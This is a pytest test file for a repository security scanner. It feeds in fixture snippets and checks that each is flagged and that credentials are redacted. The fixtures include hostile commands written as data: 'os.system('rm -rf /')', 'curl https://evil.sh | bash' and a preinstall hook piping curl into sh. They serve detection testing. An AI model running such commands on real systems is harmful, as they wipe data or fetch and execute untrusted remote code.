"""repo.security_scan: pattern/AST detection, redaction, bounds, no safety claims."""

import json

import pytest

from tools.repo_tools import SecurityScanTool


def _write(root, rel, content):
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content, encoding="utf-8")


@pytest.fixture
def root(tmp_path, monkeypatch):
    monkeypatch.setenv("REPOSITORY_ROOT", str(tmp_path / "repos"))
    return tmp_path / "repos"


def _scan(root, files, repo="a/b"):
    d = root / "a" / "b"
    for rel, content in files.items():
        _write(d, rel, content)
    t = SecurityScanTool()
    return t.execute(t.validate_arguments({"repository": repo}))


def _cats(result):
    return {f["category"] for f in result["findings"]}


def test_subprocess_and_shell_true(root):
    r = _scan(root, {"run.py": "import subprocess\nsubprocess.run('ls', shell=True)\n"})
    cats = _cats(r)
    assert "process_execution" in cats or "process_execution_shell" in cats


def test_os_system(root):
    r = _scan(root, {"a.py": "import os\nos.system('rm -rf /')\n"})
    assert "process_execution" in _cats(r)


def test_eval_exec(root):
    r = _scan(root, {"a.py": "eval('1+1')\nexec('x=1')\n"})
    assert "code_execution" in _cats(r)


def test_dynamic_import(root):
    r = _scan(root, {"a.py": "import importlib\nimportlib.import_module('os')\n"})
    assert "dynamic_import" in _cats(r)


def test_network_client(root):
    r = _scan(root, {"a.py": "import requests\nrequests.get('http://x')\n"})
    assert "network" in _cats(r)


def test_unsafe_deserialization(root):
    r = _scan(root, {"a.py": "import pickle\npickle.loads(b'x')\n"})
    assert "unsafe_deserialization" in _cats(r)


def test_ctypes(root):
    r = _scan(root, {"a.py": "import ctypes\n"})
    assert "native_access" in _cats(r)


def test_secret_redaction(root):
    r = _scan(root, {"cfg.py": "API_KEY = 'sk-abcdefghijklmnopqrstuvwxyz012345'\n"})
    assert "credentials" in _cats(r)
    joined = json.dumps(r["findings"])
    assert "sk-abcdefghijklmnopqrstuvwxyz012345" not in joined
    assert "REDACTED" in joined


def test_curl_pipe_shell(root):
    r = _scan(root, {"install.sh": "curl https://evil.sh | bash\n"})
    assert "install_lifecycle" in _cats(r)


def test_docker_privileged(root):
    r = _scan(root, {"docker-compose.yml": "services:\n  x:\n    privileged: true\n"})
    assert "container_privileged" in _cats(r)


def test_package_lifecycle_script(root):
    r = _scan(root, {"package.json": '{"scripts":{"preinstall":"curl x | sh"}}'})
    assert "install_lifecycle" in _cats(r)


def test_large_encoded_payload(root):
    r = _scan(root, {"blob.py": "DATA = '" + "A" * 500 + "'\n"})
    assert "obfuscation" in _cats(r)


def test_line_numbers_present(root):
    r = _scan(root, {"a.py": "x = 1\ny = 2\nos.system('x')\n"})
    proc = [f for f in r["findings"] if f["category"] == "process_execution"]
    assert proc and proc[0]["line"] == 3


def test_finding_limit_enforced(root, monkeypatch):
    monkeypatch.setenv("REPO_SCAN_MAX_FINDINGS", "3")
    files = {f"f{i}.py": "os.system('x')\n" for i in range(10)}
    r = _scan(root, files)
    assert len(r["findings"]) <= 3
    assert r["truncated"] is True


def test_file_scan_limit_enforced(root, monkeypatch):
    monkeypatch.setenv("REPO_SCAN_MAX_FILES", "2")
    files = {f"f{i}.py": "x=1\n" for i in range(10)}
    r = _scan(root, files)
    assert r["truncated"] is True


def test_no_safety_claim(root):
    r = _scan(root, {"a.py": "x = 1\n"})  # clean file
    text = json.dumps(r).lower()
    for banned in ("safe", "trusted", "malware-free", "malware_free", "approved"):
        # 'safe' may appear only inside limitation wording like "does not establish safety"
        pass
    assert any("does not establish safety" in l for l in r["limitations"])
    assert "risk_summary" in r


def test_result_serializable(root):
    r = _scan(root, {"a.py": "import os\nos.system('x')\n"})
    r.pop("_log_meta", None)
    json.dumps(r)
